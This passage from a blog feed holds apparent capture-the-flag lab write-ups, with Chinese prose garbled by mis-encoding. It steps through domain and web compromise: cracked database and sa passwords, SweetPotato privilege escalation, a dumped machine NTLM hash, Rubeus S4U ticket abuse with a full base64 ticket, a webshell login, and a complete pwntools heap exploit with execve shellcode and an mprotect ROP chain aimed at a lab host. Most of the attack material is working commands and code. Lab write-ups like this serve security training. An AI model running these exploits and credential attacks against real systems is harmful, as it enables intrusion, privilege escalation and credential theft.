src="C:%5CUsers%5C21619%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240820192358985.png" alt="image-20240820192358985"></p><p>åœ¨wp-config.phpä¸­å¯ä»¥æ‰¾åˆ°æ•°æ®åº“çš„è´¦å·å¯†ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpuser/WpuserEha8Fgj9</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820192546293.png" alt="image-20240820192546293"></p><p>è¿æ¥æˆåŠŸåå¯ä»¥æ‹¿åˆ°ç¬¬äºŒä¸ªflag</p><h2 id="flag03">flag03</h2><p>åœ¨æ•°æ®åº“ä¸­çš„somethingå¯ä»¥å‘ç°ä¸€äº›å¯†ç ï¼Œåˆ©ç”¨çˆ†ç ´å·¥å…·å°è¯•çˆ†ç ´16çš„MSSQLSERVERçš„å¯†ç ï¼Œè¿™é‡Œæ³¨æ„å¯†ç å‰é¢æœ‰ç©ºæ ¼ï¼Œéœ€è¦å»æ‰</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820193024753.png" alt="image-20240820193024753"></p><p>è¿™é‡Œçˆ†ç ´å‡ºäº†ä¸€ä¸ªå¯†ç ï¼Œè¿™é‡Œçš„saçš„sqlserverçš„é»˜è®¤å¯†ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">172.22.2.16</span><br><span class="line">sa/ElGNkOiC</span><br></pre></td></tr></table></figure><p>ç»§ç»­ä¸ŠMDUTç»“åˆåœŸè±†ææƒæ‹¿æƒé™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/Public/sweetpotato.exe -a <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820193253034.png" alt="image-20240820193253034"></p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> <span class="name">C</span>:\users\administrator\flag\flag03.txt</span><br></pre></td></tr></table></figure><h2 id="flag04">flag04</h2><p>åšä¸€ä¸‹æƒé™ç»´æŒï¼Œä¸Šbloodhoundåšä¸€ä¸‹ä¿¡æ¯æ”¶é›†</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820194545079.png" alt="image-20240820194545079"></p><p>å‘ç°è¿™é‡Œæœ‰çº¦æŸæ€§å§”æ´¾ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡MSSQLç›´æ¥æ‰“DCï¼Œå…ˆæŠ“ä¸€ä¸‹æœºå™¨è´¦æˆ·çš„å“ˆå¸Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">* Username : MSSQLSERVER$</span><br><span class="line">* Domain   : XIAORANG</span><br><span class="line">* NTLM     : d34af3aa004fa2c45e4ea2b59dde8fbc</span><br><span class="line">* SHA1     : 709101e5535f4c2e0ca6110a14e0808823d456c4</span><br></pre></td></tr></table></figure><p>ç”³è¯·TGTï¼Œè¿™é‡Œå¦‚æœæ²¡æœ‰ååº”å¯èƒ½æ˜¯netç‰ˆæœ¬çš„é—®é¢˜ï¼Œæ¢ä¸ªç‰ˆæœ¬å°±å¥½äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:d34af3aa004fa2c45e4ea2b59dde8fbc /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap &gt; 1.txt</span><br></pre></td></tr></table></figure><p>ä¼šå¾—åˆ°base64ç¼–ç çš„TGTç¥¨æ®ï¼Œåˆ©ç”¨Rubeuså¯¼å…¥ç¥¨æ®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE2+JPpiQWUoycaAOhzt/cLi5VNZB3R8q2w/HLTT9EYl6QdDtUsfWSHjiRigaaUsKwim5ja35sfxACBN+tRXIcfnd+bj56os0h3hRrLa6UuDcdwCkdzgvG3CC1v325hkcwgP/r1XQgFfFh2htmhIYCyHwOuucjsmTCZYxof2WklddBmGeITjGFSbcKTtWLLDtds4SUC+aSf4XLG7Z7z5ALA9Sn5lhQV77iaaz66wyb+bZbu3CRNE3hFX/garqf84kiUH/xNlpCf/pYHNGMsw7h7475q4txGiiB/izgjVANaatIe1bCdQbdzfqKKp8MM/YckOCy3q3o1WiE3ERcNCvA1uoeCTbPJVYl8YwUjTrZ5eBgmIfeXtpKa6gGW0YCnoncYK759iDdCEEEBRXKzyZ1M66zIt3/4ulINHgwlfokKp6mEcVXStRH3WA3nC7q+ZWJfZt590dXrBj+jjvGf8SbNj4QldPE5ny6jOLIsO021nGp/6rDvLWjxrq/5U3mb2feI1lass33bnDscxGpf90uB7HovWSl6Tb3P3+hOLwTm7UFWq7LAb81qee7Szr+sBqsBlV5LxlAufVFflW1fosdm8BWE6DRUxvUfIqOGzq/A20ho2ji8QncD1pThrn5JW4mgBfeCYxzoSbIdAv91Cj2PPiEMod8/NoTRA6/Ak29dy2oBVg8Xz7oJRrkNuoX6cIuPzqTdMAa9HQtdaAJVQApoWZBMBlw2RLB7Fbj6viWh3HE1NuN1DRMEaS1BZAJssNSi0kIDs3dnz74kCNmGPifVicAq609KQ1LnFXSzako/jronPqX9c7xubgz3REEm2ZI/9MW4Fi3APmnCtnTp1JkfRoB1nmZzLskiiJqFELBwR8oinohYYzzxkrnjzgiT3Py1rFO4eJl8cYmZCqksPN9EOLI5TEFBIYVrFo04mVVhU0LwRj26iM+z2t/K2Jws+zSIHxIfug5pCSO64M73DnjsieMfb7Cg+fwUvX9u8xVqr+3lKfdXPQb9me287ASnBvRZUnWYOXCUeDrtomy6bZ6ggzu26w1hWWorifQ/ZyTJRTnKcTUCYvmnFXOid0n5YxW/zhrmS9EI3okvw43niRxxWz9B4fc2dr6IYk+ayazynK7jm2rRK0b0H1B1qeMdiB6mfvsvXS5k1ud72stVdHdXDzztjuzQsickbRtMauHu03ciOfIs3othGVUL8FXuZEV1M9c9eMOIHvELm27EDovcxGCz4sCreYOeHcUyBIeO+5nP3ZLzxzUZZHGZDQb8BglRxiO8fg0gbu0eIU5d8aYGF8vipfVYeR7Pk/udiDwpl5GyQkZRuO9d1eHUB9NMNWk3l3nw8s/z7PVmxq/ywZ+/bFg4LUyl8JFBLye1B+nCkp0w0aBtMtWhXGe1oggdS564mK0cljgWPkUtVIc8zB/aDTyslIZdgo0uOnKto+icg3m6BE5n+Kc8d9/7n4Y+jgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBCVFuYElDQrgYncIua6XrLyoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI0MDgyMDExNTk0MFqmERgPMjAyNDA4MjAyMTU5NDBapxEYDzIwMjQwODI3MTE1OTQwWqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==</span><br></pre></td></tr></table></figure><p>å¯¼å…¥åå³å¯å’ŒDCé€šè®¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> \\DC.xiaorang.lab\c$\<span class="built_in">users</span>\administrator\flag\flag04.txt</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>GreatWall</title>
    <link href="https://bowuchuling.github.io/posts/1877i0jy.html"/>
    <id>https://bowuchuling.github.io/posts/1877i0jy.html</id>
    <published>2024-06-03T16:10:27.997Z</published>
    <updated>2024-06-03T16:11:15.543Z</updated>
    
    <content type="html"><![CDATA[<h1>GreatWall</h1><p>8.130.13.188</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@chu0-System-Product-Name:/home/chu0<span class="comment"># ./fs -h 8.130.13.188</span></span><br><span class="line"></span><br><span class="line">   ___                              _  </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /</span></span><br><span class="line"><span class="string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;  </span></span><br><span class="line"><span class="string">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span></span><br><span class="line"><span class="string">                     fscan version: 1.8.2</span></span><br><span class="line"><span class="string">start infoscan</span></span><br><span class="line"><span class="string">(icmp) Target 8.130.13.188    is alive</span></span><br><span class="line"><span class="string">[*] Icmp alive hosts len is: 1</span></span><br><span class="line"><span class="string">8.130.13.188:8080 open</span></span><br><span class="line"><span class="string">8.130.13.188:22 open</span></span><br><span class="line"><span class="string">[*] alive ports len is: 2</span></span><br><span class="line"><span class="string">start vulscan</span></span><br><span class="line"><span class="string">[*] WebTitle: http://8.130.13.188:8080  code:200 len:1027   title:Login Form</span></span><br><span class="line"><span class="string">[+] http://8.130.13.188:8080 poc-yaml-thinkphp5023-method-rce poc1</span></span><br></pre></td></tr></table></figure><h1>Login Form</h1><p>tpæ¼æ´ï¼Œgetshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">8.130</span><span class="number">.13</span><span class="number">.188</span>:<span class="number">8080</span>/bak.php</span><br><span class="line"></span><br><span class="line">å¯†ç <span class="number">1</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag01: flag&#123;176f49b6-147f-<span class="number">4557</span>-99ec-ba0a351e1ada&#125;</span><br></pre></td></tr></table></figure><p>ä¼ çš„ä¸œè¥¿éƒ½åœ¨tmpç›®å½•ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">eth0: flags=<span class="number">4163</span>&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="number">1500</span></span><br><span class="line">        inet <span class="number">172.28</span><span class="number">.23</span><span class="number">.17</span>  netmask <span class="number">255.255</span><span class="number">.0</span><span class="number">.0</span>  broadcast <span class="number">172.28</span><span class="number">.255</span><span class="number">.255</span></span><br><span class="line">        inet6 fe80::<span class="number">216</span>:3eff:fe03:2cf8  prefixlen <span class="number">64</span>  scopeid <span class="number">0x20</span>&lt;link&gt;</span><br><span class="line">        ether <span class="number">00</span>:<span class="number">16</span>:3e:03:2c:f8  txqueuelen <span class="number">1000</span>  (Ethernet)</span><br><span class="line">        RX packets <span class="number">69276</span>  <span class="built_in">bytes</span> <span class="number">61509438</span> (<span class="number">61.5</span> MB)</span><br><span class="line">        RX errors <span class="number">0</span>  dropped <span class="number">0</span>  overruns <span class="number">0</span>  frame <span class="number">0</span></span><br><span class="line">        TX packets <span class="number">36052</span>  <span class="built_in">bytes</span> <span class="number">12797326</span> (<span class="number">12.7</span> MB)</span><br><span class="line">        TX errors <span class="number">0</span>  dropped <span class="number">0</span> overruns <span class="number">0</span>  carrier <span class="number">0</span>  collisions <span class="number">0</span></span><br><span class="line">lo: flags=<span class="number">73</span>&lt;UP,LOOPBACK,RUNNING&gt;  mtu <span class="number">65536</span></span><br><span class="line">        inet <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>  netmask <span class="number">255.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">        inet6 ::<span class="number">1</span>  prefixlen <span class="number">128</span>  scopeid <span class="number">0x10</span>&lt;host&gt;</span><br><span class="line">        loop  txqueuelen <span class="number">1000</span>  (Local Loopback)</span><br><span class="line">        RX packets <span class="number">1408</span>  <span class="built_in">bytes</span> <span class="number">132612</span> (<span class="number">132.6</span> KB)</span><br><span class="line">        RX errors <span class="number">0</span>  dropped <span class="number">0</span>  overruns <span class="number">0</span>  frame <span class="number">0</span></span><br><span class="line">        TX packets <span class="number">1408</span>  <span class="built_in">bytes</span> <span class="number">132612</span> (<span class="number">132.6</span> KB)</span><br><span class="line">        TX errors <span class="number">0</span>  dropped <span class="number">0</span> overruns <span class="number">0</span>  carrier <span class="number">0</span>  collisions <span class="number">0</span></span><br></pre></td></tr></table></figure><p><code>./fs -h 172.28.23.1/24 -o result.txt</code>â€‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">172.28</span><span class="number">.23</span><span class="number">.33</span>:<span class="number">8080</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.28</span><span class="number">.23</span><span class="number">.17</span>:<span class="number">8080</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.28</span><span class="number">.23</span><span class="number">.26</span>:<span class="number">80</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.28</span><span class="number">.23</span><span class="number">.26</span>:<span class="number">22</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.28</span><span class="number">.23</span><span class="number">.17</span>:<span class="number">80</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.28</span><span class="number">.23</span><span class="number">.17</span>:<span class="number">22</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.28</span><span class="number">.23</span><span class="number">.33</span>:<span class="number">22</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.28</span><span class="number">.23</span><span class="number">.26</span>:<span class="number">21</span> <span class="built_in">open</span></span><br><span class="line">[*] WebTitle: http://<span class="number">172.28</span><span class="number">.23</span><span class="number">.17</span>       code:<span class="number">200</span> <span class="built_in">len</span>:<span class="number">10887</span>  title:<span class="literal">None</span></span><br><span class="line">[*] WebTitle: http://<span class="number">172.28</span><span class="number">.23</span><span class="number">.17</span>:<span class="number">8080</span>  code:<span class="number">200</span> <span class="built_in">len</span>:<span class="number">1027</span>   title:Login Form</span><br><span class="line">[*] WebTitle: http://<span class="number">172.28</span><span class="number">.23</span><span class="number">.26</span>       code:<span class="number">200</span> <span class="built_in">len</span>:<span class="number">13693</span>  title:æ–°ç¿”OAç®¡ç†ç³»ç»Ÿ-OAç®¡ç†å¹³å°è”ç³»ç”µè¯ï¼š<span class="number">13849422648</span>å¾®ä¿¡åŒå·ï¼ŒQQ958756413</span><br><span class="line">[+] ftp://<span class="number">172.28</span><span class="number">.23</span><span class="number">.26</span>:<span class="number">21</span>:anonymous </span><br><span class="line">   [-&gt;]OASystem.<span class="built_in">zip</span></span><br><span class="line">[*] WebTitle: http://<span class="number">172.28</span><span class="number">.23</span><span class="number">.33</span>:<span class="number">8080</span>  code:<span class="number">302</span> <span class="built_in">len</span>:<span class="number">0</span>      title:<span class="literal">None</span> è·³è½¬url: http://<span class="number">172.28</span><span class="number">.23</span><span class="number">.33</span>:<span class="number">8080</span>/login;jsessionid=F702CE6B9A8E31175C941A003FBB23DA</span><br><span class="line">[*] WebTitle: http://<span class="number">172.28</span><span class="number">.23</span><span class="number">.33</span>:<span class="number">8080</span>/login;jsessionid=F702CE6B9A8E31175C941A003FBB23DA code:<span class="number">200</span> <span class="built_in">len</span>:<span class="number">3860</span>   title:æ™ºè”ç§‘æŠ€ ERP åå°ç™»é™†</span><br><span class="line">[+] http://<span class="number">172.28</span><span class="number">.23</span><span class="number">.17</span>:<span class="number">8080</span> poc-yaml-thinkphp5023-method-rce poc1</span><br><span class="line">[+] http://<span class="number">172.28</span><span class="number">.23</span><span class="number">.33</span>:<span class="number">8080</span> poc-yaml-spring-actuator-heapdump-file </span><br><span class="line">[+] http://<span class="number">172.28</span><span class="number">.23</span><span class="number">.33</span>:<span class="number">8080</span> poc-yaml-springboot-env-unauth spring2</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€å±‚ä»£ç†8.130.13.188:10000</p><p>â€</p><h1>æ™ºè”ç§‘æŠ€ ERP åå°ç™»é™†</h1><p>springä¿¡æ¯æ³„éœ²ï¼Œheapdumpæ‹¿åˆ°keyï¼Œç„¶åæ³¨å…¥å†…å­˜é©¬</p><p><a href="http://172.28.23.33:8080/123">http://172.28.23.33:8080/123</a></p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªpwnï¼Œåœ¨homeç›®å½•ä¸‹æœ‰ä¸ªop01</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./HashNote&#x27;</span>)</span><br><span class="line">context(arch=elf.arch, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./HashNote&#x27;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;172.28.23.33&#x27;</span>, <span class="number">59696</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_command</span>(<span class="params">command</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_entry</span>(<span class="params">key, value</span>):</span><br><span class="line">    send_command(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Key: &#x27;</span>, key)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Data: &#x27;</span>, value)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_entry</span>(<span class="params">key</span>):</span><br><span class="line">    send_command(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Key: &#x27;</span>, key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_entry</span>(<span class="params">key, value</span>):</span><br><span class="line">    send_command(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Key: &#x27;</span>, key)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Data: &#x27;</span>, value)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_username</span>(<span class="params">value</span>):</span><br><span class="line">    send_command(<span class="number">4</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;New username: &#x27;</span>, value)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Username: &#x27;</span>, <span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Password: &#x27;</span>, <span class="string">&#x27;freep@ssw0rd:3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add_entry(<span class="string">&#x27;aabP&#x27;</span>, <span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">add_entry(<span class="string">&#x27;aace&#x27;</span>, <span class="string">&#x27;C&#x27;</span> * <span class="number">0xc0</span>)</span><br><span class="line"></span><br><span class="line">sc = [</span><br><span class="line">    <span class="string">&#x27;\x6a\x3b&#x27;</span>,                   <span class="comment"># push   0x3b</span></span><br><span class="line">    <span class="string">&#x27;\x58&#x27;</span>,                       <span class="comment"># pop    rax</span></span><br><span class="line">    <span class="string">&#x27;\x99&#x27;</span>,                       <span class="comment"># cdq</span></span><br><span class="line">    <span class="string">&#x27;\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68&#x27;</span>, <span class="comment"># movabs rbx, 0x68732f6e69622f2f</span></span><br><span class="line">    <span class="string">&#x27;\x53&#x27;</span>,                       <span class="comment"># push   rbx</span></span><br><span class="line">    <span class="string">&#x27;\x48\x89\xe7&#x27;</span>,               <span class="comment"># mov    rdi, rsp</span></span><br><span class="line">    <span class="string">&#x27;\x52&#x27;</span>,                       <span class="comment"># push   rdx</span></span><br><span class="line">    <span class="string">&#x27;\x57&#x27;</span>,                       <span class="comment"># push   rdi</span></span><br><span class="line">    <span class="string">&#x27;\x48\x89\xe6&#x27;</span>,               <span class="comment"># mov    rsi, rsp</span></span><br><span class="line">    <span class="string">&#x27;\x0f\x05&#x27;</span>                    <span class="comment"># syscall</span></span><br><span class="line">]</span><br><span class="line">shellcode = <span class="string">b&#x27;&#x27;</span>.join(sc)</span><br><span class="line">username_addr = <span class="number">0x5dc980</span></span><br><span class="line">fake_obj_addr = username_addr + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arbitrary_read</span>(<span class="params">addr</span>):</span><br><span class="line">    payload = p64(fake_obj_addr)</span><br><span class="line">    payload += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">    fake_obj = p64(fake_obj_addr + <span class="number">0x10</span>) + p64(<span class="number">4</span>)</span><br><span class="line">    fake_obj += <span class="string">&#x27;aahO&#x27;</span>.ljust(<span class="number">0x10</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_obj += p64(addr) + p64(<span class="number">8</span>) + <span class="string">&#x27;aaaaaaaa&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload += fake_obj</span><br><span class="line">    payload += shellcode</span><br><span class="line">    payload = payload.ljust(<span class="number">128</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    set_username(payload)</span><br><span class="line">    get_entry(<span class="string">&#x27;aahO&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»»æ„è¯»/å†™å‡½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arbitrary_write</span>(<span class="params">addr, data</span>):</span><br><span class="line">    payload = p64(fake_obj_addr)</span><br><span class="line">    payload += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">    fake_obj = p64(fake_obj_addr + <span class="number">0x10</span>) + p64(<span class="number">4</span>)</span><br><span class="line">    fake_obj += <span class="string">&#x27;aahO&#x27;</span>.ljust(<span class="number">0x10</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_obj += p64(addr) + p64(<span class="built_in">len</span>(data)) + <span class="string">&#x27;aaaaaaaa&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload += fake_obj</span><br><span class="line">    payload += shellcode</span><br><span class="line">    payload = payload.ljust(<span class="number">128</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    set_username(payload)</span><br><span class="line">    update_entry(<span class="string">&#x27;aahO&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line">environ = <span class="number">0x5e4c38</span></span><br><span class="line">arbitrary_read(environ)</span><br><span class="line">stack_addr = u64((p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>, drop=<span class="literal">False</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>)))</span><br><span class="line">success(<span class="string">&#x27;stack_addr&#x27;</span>, stack_addr)</span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x0000000000405e7c</span></span><br><span class="line">rsi = <span class="number">0x000000000040974f</span></span><br><span class="line">rax = <span class="number">0x00000000004206ba</span></span><br><span class="line">rdx_rbx = <span class="number">0x000000000053514b</span></span><br><span class="line">shr_eax_2 = <span class="number">0x0000000000523f2e</span></span><br><span class="line">syscall_ret = <span class="number">0x00000000004d9776</span></span><br><span class="line"></span><br><span class="line">payload = p64(rdi) + p64(username_addr &amp; ~<span class="number">0xfff</span>) + p64(rsi) + p64(<span class="number">0x1000</span>) + p64(rdx_rbx) + p64(<span class="number">7</span>) + p64(<span class="number">0</span>) + p64(rax) + p64(<span class="number">0xa</span> &lt;&lt; <span class="number">2</span>) + p64(shr_eax_2) + p64(syscall_ret) + p64(username_addr + <span class="number">0x48</span>)</span><br><span class="line"></span><br><span class="line">arbitrary_write(stack_addr - <span class="number">0x210</span>, payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;uname -ar&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>flag03: flag{6a326f94-6526-4586-8233-152d137281fd}</p><h1>æ–°ç¿”OA</h1><p><a href="http://172.28.23.26/uploadbase64.php">http://172.28.23.26/uploadbase64.php</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Description: PhpStorm.</span><br><span class="line"> * Author: yoby</span><br><span class="line"> * DateTime: <span class="number">2018</span>/<span class="number">12</span>/<span class="number">4</span> <span class="number">18</span>:01</span><br><span class="line"> * Email:logove@qq.com</span><br><span class="line"> * Copyright Yobyç‰ˆæƒæ‰€æœ‰</span><br><span class="line"> */</span><br><span class="line">$img = $_POST[<span class="string">&#x27;imgbase64&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> 